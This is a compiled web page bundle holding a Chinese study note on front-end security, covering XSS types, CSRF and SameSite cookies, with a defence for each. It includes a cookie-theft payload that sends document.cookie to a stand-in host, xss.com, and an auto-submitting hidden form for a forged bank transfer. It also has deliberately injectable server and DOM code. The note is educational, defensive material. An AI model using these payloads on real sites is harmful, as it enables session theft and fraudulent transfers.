import{_ as t,c as s,o as i,a4 as a}from"./chunks/framework.ClEHkwpW.js";const u=JSON.parse('{"title":"","description":"","frontmatter":{},"headers":[],"relativePath":"frontend/js/前端安全.md","filePath":"frontend/js/前端安全.md"}'),e={name:"frontend/js/前端安全.md"},l=a(`<h2 id="安全问题" tabindex="-1">安全问题 <a class="header-anchor" href="#安全问题" aria-label="Permalink to &quot;安全问题&quot;">​</a></h2><ul><li>跨站脚本 (Cross-Site Scripting, XSS)</li><li>跨站请求伪造（Cross-Site Request Forgeries，CSRF）</li><li>iframe的滥用: iframe中的内容是由第三方来提供的</li><li>恶意第三方库，JavaScript应用库event-stream</li></ul><h2 id="xss" tabindex="-1">XSS <a class="header-anchor" href="#xss" aria-label="Permalink to &quot;XSS&quot;">​</a></h2><h3 id="反射型xss" tabindex="-1">反射型XSS <a class="header-anchor" href="#反射型xss" aria-label="Permalink to &quot;反射型XSS&quot;">​</a></h3><p>反射型XSS也叫非持久型XSS，是指攻击者将恶意代码拼写在URL中提交给服务端，服务端返回的内容，也带上了这段XSS代码，最后导致浏览器执行了这段恶意代码</p><p>比如服务端采用<code>express.j</code>并使用ejs进行服务端渲染，服务端接收到地址栏search参数时，会将其传入到模板的search变量中，并生成HTML</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">app.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">get</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/reflection&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">req</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">res</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">){ </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  res.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">render</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;reflection&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, { search: req.query.search }); </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">})</span></span></code></pre></div><p>比如有攻击者想获取用户cookie，编写了下面一段JavaScript代码。通过动态创建一个script标签，然后把当前cookie发送给目标地址 xss.com</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">	s</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">createElement</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;script&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">); </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">	s.src</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">\`xss.com?cookie=\${</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">cookie</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}\`</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">	document.head.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">append</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(s) </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>那么就可以将代码进行 URI 转码之后，赋值给 URL 参数 search，把这个参数添加到对应的网址并发送给对应的用户即可获取它的 cookie</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">search</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;var s=document.createElement(&#39;script&#39;);s.src=\`xss.com?cookie=\${document.cookie}\`;document.head.append(s);&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><h3 id="存储型xss" tabindex="-1">存储型XSS <a class="header-anchor" href="#存储型xss" aria-label="Permalink to &quot;存储型XSS&quot;">​</a></h3><p>存储型的恶意代码存储在数据库等地方，每次访问页面都会触发 XSS。比如一些网站允许用户设置一段个性签名，并且显示在个人主页，</p><p>攻击者就可以在个性签名中输入恶意代码并提交到服务端，如果这段代码没有进行任何处理直接存储到数据库，</p><p>那么其他用户访问这个个人主页的时候都会执行这段恶意代码。</p><h3 id="dom型xss" tabindex="-1">Dom型XSS <a class="header-anchor" href="#dom型xss" aria-label="Permalink to &quot;Dom型XSS&quot;">​</a></h3><p>DOM 型 XSS 可以看作一种特殊的反射型 XSS，它也是一种非持久型 XSS，不过相对于反射型 XSS 而言它不需要经过服务端。</p><p>比如在上面的例子中，如果把解析 URL 参数search的逻辑放在前端页面进行，那么攻击类型就属于DOM型</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span>&lt;script&gt; </span></span>
<span class="line"><span>var search = location.search.replace(&#39;?search=&#39;, &#39;&#39;) </span></span>
<span class="line"><span>document.write(&quot;你搜索了 :&quot; + decodeURI(search)) </span></span>
<span class="line"><span>&lt;/script&gt;</span></span></code></pre></div><h3 id="防御手段" tabindex="-1">防御手段 <a class="header-anchor" href="#防御手段" aria-label="Permalink to &quot;防御手段&quot;">​</a></h3><ul><li><strong>参数校验</strong>。对于 HTTP 请求的 URL 参数和请求体 payload 的数据进行校验，比如我们接收的数据是用户年龄， 那么在后端，需要判断一下数据是否是 Number，对于不符合校验规则的数据及时抛出错误。</li><li><strong>字符转码</strong>。对于一些特殊符号，比如“&lt;”“&gt;”“&amp;”“&quot;”“&#39;”“/”，我们需要对其进行转义，后端接收这些代码时候的转义存储， 前端在显示的时候，再把它们转成原来的字符串进行显示。 对于用户输入的字符串内容，不要使用 eval、new Function 等动态执行字符串的方法， 也不要将这些字符串通过 innerHTML、outerHTML、document.write() 方式直接写到 HTML 中。对于非客户端 cookie，</li><li><strong>使用HttpOnly属性</strong>，比如保存用户凭证的session，将其设置为http only，避免前端访问cookie</li><li><strong>充分利用 CSP</strong>，禁止向第三方域提交数据，禁止执行内联脚本和未授权的脚本</li></ul><h2 id="csrf" tabindex="-1">CSRF <a class="header-anchor" href="#csrf" aria-label="Permalink to &quot;CSRF&quot;">​</a></h2><h3 id="攻击原理" tabindex="-1">攻击原理 <a class="header-anchor" href="#攻击原理" aria-label="Permalink to &quot;攻击原理&quot;">​</a></h3><p>比如，用户A在银行有一笔存款，通过对银行的网站发送请求：<a href="http://bank.com/withdraw?amount=100&amp;to=B%E3%80%82" target="_blank" rel="noreferrer">http://bank.com/withdraw?amount=100&amp;to=B。</a> 可以让A把100的存款转到B的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，验证成功后代码用户 A 已经成功登录。 攻击者C就可以通过替换URL中的参数把钱转入自己的账户中，但这个请求必须由A发出。所以他先自己做一个网站，在网站中放入如下代码：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span>&lt;img src=&quot;http://bank.com/withdraw?amount=100&amp;to=C&quot; /&gt;</span></span></code></pre></div><p>然后通过广告等方式诱使 A 来访问他的网站，当 A 访问该网站时，浏览器就会附带上 cookie 发出的转账请求。 大多数情况下，该请求可能会失败，因为他要求 A 的认证信息。但是，如果 A 当时恰巧刚访问这个网站不久， 他的浏览器与网站之间的 session 尚未过期，浏览器的 cookie 中含有 A 的认证信息。那么此时这个请求就会成功， 钱将从用户 A 的账号转移到攻击者 C 的账号，而 A 对此毫不知情。 即使日后 A 发现账户钱少了，去银行查询转账记录，也只能发现确实有一个来自他本人的合法请求转移了资金，找不到被攻击的痕迹。 当然真实场景下不会通过 GET 请求去提交操作，而是采用 POST 请求。但即时如此，攻击者也可以在页面中嵌入隐藏表单并通过脚本来触发操作。 比如像下面的代码，创建了两个表单字段，分别为 amount 和 to，然后自动执行 JavaScript 脚本提交表单。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span>&lt;form action=&quot;http://bank.com/withdraw&quot; method=&quot;POST&quot;&quot;&gt; </span></span>
<span class="line"><span>    &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;100&quot; /&gt; </span></span>
<span class="line"><span>    &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;C&quot; /&gt; </span></span>
<span class="line"><span>&lt;/form&gt; </span></span>
<span class="line"><span>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span></span></code></pre></div><h3 id="防御手段-1" tabindex="-1">防御手段 <a class="header-anchor" href="#防御手段-1" aria-label="Permalink to &quot;防御手段&quot;">​</a></h3><ul><li>验证码被认为是对抗CSRF攻击最简洁而有效的防御方法</li><li><strong>验证来源</strong>,Origin 属性只包含了域名信息，referer包含具体的URL路径</li><li>添加token验证，要抵御CSRF，关键在于在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中</li><li><code>Samesite Cookie</code>属性</li></ul><h3 id="samesite-cookie" tabindex="-1">Samesite Cookie <a class="header-anchor" href="#samesite-cookie" aria-label="Permalink to &quot;Samesite Cookie&quot;">​</a></h3><p>Cookie的SameStie属性用来限制第三方Cookie，从而减少安全风险（防止CSRF攻击）和用户追踪</p><p><strong>Strict</strong>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致， 才会带上 Cookie。这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接， 用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。 <code>Set-Cookie: CookieName=CookieValue; SameSite=Strict;</code></p><p><strong>None</strong> <code>Set-Cookie: widget_session=abc123; SameSite=None; Secure;</code> Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。 不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</p><p><strong>Lax</strong> 规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。</p><table><thead><tr><th style="text-align:left;">请求类型</th><th style="text-align:left;">示例</th><th style="text-align:left;">正常情况</th><th style="text-align:left;">Lax</th></tr></thead><tbody><tr><td style="text-align:left;">链接</td><td style="text-align:left;"><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td><td style="text-align:left;">发送 Cookie</td><td style="text-align:left;">发送 Cookie</td></tr><tr><td style="text-align:left;">预加载</td><td style="text-align:left;"><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td><td style="text-align:left;">发送 Cookie</td><td style="text-align:left;">发送 Cookie</td></tr><tr><td style="text-align:left;">GET表单</td><td style="text-align:left;"><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td><td style="text-align:left;">发送 Cookie</td><td style="text-align:left;">发送 Cookie</td></tr><tr><td style="text-align:left;">POST表单</td><td style="text-align:left;"><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td><td style="text-align:left;">发送 Cookie</td><td style="text-align:left;">不发送</td></tr><tr><td style="text-align:left;">iframe</td><td style="text-align:left;"><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td><td style="text-align:left;">发送 Cookie</td><td style="text-align:left;">不发送</td></tr><tr><td style="text-align:left;">AJAX</td><td style="text-align:left;"><code>$.get(&quot;...&quot;)</code></td><td style="text-align:left;">发送 Cookie</td><td style="text-align:left;">不发送</td></tr><tr><td style="text-align:left;">Image</td><td style="text-align:left;"><code>&lt;img src=&quot;...&quot;&gt;</code></td><td style="text-align:left;">发送 Cookie</td><td style="text-align:left;">不发送</td></tr></tbody></table>`,35),n=[l];function o(p,h,r,d,k,c){return i(),s("div",null,n)}const E=t(e,[["render",o]]);export{u as __pageData,E as default};
